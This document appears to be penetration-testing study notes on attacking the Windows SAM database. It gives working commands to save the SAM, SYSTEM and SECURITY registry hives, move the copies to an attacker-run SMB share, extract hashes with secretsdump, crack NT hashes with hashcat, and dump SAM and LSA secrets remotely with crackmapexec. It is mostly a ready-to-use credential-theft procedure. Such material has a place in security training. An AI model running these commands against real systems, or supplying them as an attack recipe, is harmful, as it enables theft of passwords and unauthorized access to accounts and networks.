## Attacking SAM

### Copying SAM Registry Hives

hives to copy (requires admin access):

| Registry Hive   | Description                                                                                                                                                |
| --------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `hklm\sam`      | Contains the hashes associated with local account passwords. We will need the hashes so we can crack them and get the user account passwords in cleartext. |
| `hklm\system`   | Contains the system bootkey, which is used to encrypt the SAM database. We will need the bootkey to decrypt the SAM database.                              |
| `hklm\security` | Contains cached credentials for domain accounts. We may benefit from having this on a domain-joined Windows target.                                        |

### Using reg.exe to Copy Registry Hives

Run those commands after launching CMD as admin:
```cmd-session
C:\WINDOWS\system32> reg.exe save hklm\sam C:\sam.save

The operation completed successfully.

C:\WINDOWS\system32> reg.exe save hklm\system C:\system.save

The operation completed successfully.

C:\WINDOWS\system32> reg.exe save hklm\security C:\security.save

The operation completed successfully.
```

### Creating Share With smbserver.py
```shell-session
$ sudo python3 /opt/impacket/examples/smbserver.py -smb2support <share name> <share directory>
```

### Moving Hives Copies to Share
```cmd-session
C:\> move sam.save \\<ip address>\<share name>
        1 file(s) moved.

C:\> move security.save \\<ip address>\<share name>
        1 file(s) moved.

C:\> move system.save \\<ip address>\<share name>
        1 file(s) moved.
```

## Dumping Hashes With Impacket's secretsdump.py

### Running secretsdump.py
```shell-session
$ python3 /opt/impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```

### Running Hashcat Against NT Hashes
```shell-session
$ sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
```

## Remote Dumping & LSA Secrets Considerations

With access to local admin credentials we can target LSA secrets over the network, allowing us to extract credentials from a running service, scheduled task, or application that uses LSA secrets to store passwords.

### Dumping LSA Secrets Remotely
```shell-session
$ crackmapexec smb <target ip> --local-auth -u <username> -p <password> --lsa
```

### Dumping SAM Remotely
```shell-session
crackmapexec smb <target ip> --local-auth -u <username> -p <password> --sam
```
